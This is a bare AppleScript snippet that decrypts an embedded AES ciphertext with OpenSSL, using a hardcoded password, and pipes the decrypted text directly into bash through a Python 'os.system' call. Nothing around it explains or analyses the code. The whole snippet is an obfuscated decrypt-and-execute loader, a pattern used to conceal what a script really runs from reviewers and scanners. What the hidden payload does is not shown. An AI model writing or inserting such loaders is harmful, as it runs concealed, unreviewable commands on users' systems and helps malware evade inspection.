-- This AES ciphertext was created using a pre-shared key
set ciphertext to "U2FsdGVkX1+H4CjZKfZsVtv6aYG+9KvUKBl+ONxOq7E="
-- Decrypt and execute using OpenSSL via Python
do shell script "python3 -c 'import os; os.system(\"echo " & ciphertext & " | openssl enc -aes-256-cbc -a -d -pass pass:MySecretKey | bash\")'"
